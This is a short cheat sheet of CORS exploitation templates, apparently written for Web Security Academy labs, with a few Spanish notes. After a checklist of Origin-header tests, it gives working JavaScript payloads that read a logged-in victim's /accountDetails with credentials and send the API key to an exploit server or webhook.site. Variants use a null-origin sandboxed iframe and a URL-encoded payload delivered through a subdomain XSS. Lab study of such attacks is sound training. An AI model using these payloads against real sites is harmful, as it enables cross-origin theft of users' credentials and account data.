Cheat Sheet:
- Access-Control-Allow-Credentials?
- Change the Origin header to an arbitrary value (para ver si lo refleja en la respuesta)
- Change the Origin header to the null value
- Change the origin header to one that begins with the origin of the site
- Change the origin header to one that ends with the origin of the site.

##### CORS Template
<script>
   var req = new XMLHttpRequest();
    req.onload = function(){
	    location = "https://exploit-0ae000ef03fb906c80c4ded101b500c5.exploit-server.net/?apikey=" + btoa(req.responseText);
    };
    req.open('GET','https://0a25000c034390fb80f4dfef008f009b.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
</script>

##### CORS when Origin allows null option
```js
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
        var req = new XMLHttpRequest();
        req.onload = function(){
	    location='https://exploit-0a6f004703a705b080351b6101ea00cf.exploit-server.net/?apikey='+ btoa(req.responseText);
        };
        req.open('GET','https://0ae90021038305c2804a1c98001200f6.web-security-academy.net/accountDetails',true);
        req.withCredentials = true;
        req.send();
    </script>">
</iframe>

```

##### CORS vulnerability with trusted insecure protocols
```
When a subdomain can be added to the CORS
Origin: http://subdomain.0a7300cb03f0fdcd819520b7005000f4.web-security-academy.net

We need to find a way of exploiting in a subdomain
For example, we got an XSS on 
http://stock.0a7300cb03f0fdcd819520b7005000f4.web-security-academy.net/?productId=<script>alert(1)</script>&storeId=1

Just append a one line CORS payload
Notice we are URL encoding
script without encoding:
<script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','https://0a7300cb03f0fdcd819520b7005000f4.web-security-academy.net/accountDetails',true);req.withCredentials = true;req.send();function reqListener() {location='https://webhook.site/c112fb6b-6dda-4608-a883-f330be43cbd6/log?key='+this.responseText;};</script>
```
```js
<html>
<body>
<script>
document.location="http://stock.0a7300cb03f0fdcd819520b7005000f4.web-security-academy.net/?productId=%3c%73%63%72%69%70%74%3e%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%30%61%63%65%30%30%37%64%30%34%62%63%62%39%33%38%38%30%63%33%65%65%37%30%30%30%64%63%30%30%61%35%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%72%65%71%2e%73%65%6e%64%28%29%3b%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%39%32%30%30%38%33%30%34%31%36%62%39%61%37%38%30%32%33%65%64%65%65%30%31%64%34%30%30%38%65%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%3f%6b%65%79%3d%27%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%7d%3b%3c%2f%73%63%72%69%70%74%3e&storeId=1"
</script>
</body>
</html>
```
